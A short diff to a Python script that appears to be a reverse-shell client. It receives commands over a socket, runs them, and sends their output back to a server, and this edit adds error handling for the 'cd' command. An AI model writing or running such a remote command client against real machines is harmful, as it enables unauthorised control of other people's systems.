@@ -36,7 +36,10 @@ while True:
 
   # the `cd` command is special, we need to change python's context
   if data[:2].decode("utf-8") == 'cd':
-    os.chdir(data[3:-1].decode("utf-8")) # the -1 removes the \n from the end of the line
+    try:
+      os.chdir(data[3:].decode("utf-8"))
+    except FileNotFoundError:
+      s.send(str.encode("Dir does not exist"))
     continue
 
   # check if there are actually data/commands received (that is not cd)
@@ -48,3 +51,4 @@ while True:
     output_str = str(output_bytes, "utf-8") # plain old basic string
     # send the command output back to the server
     s.send(str.encode(output_str))
+  
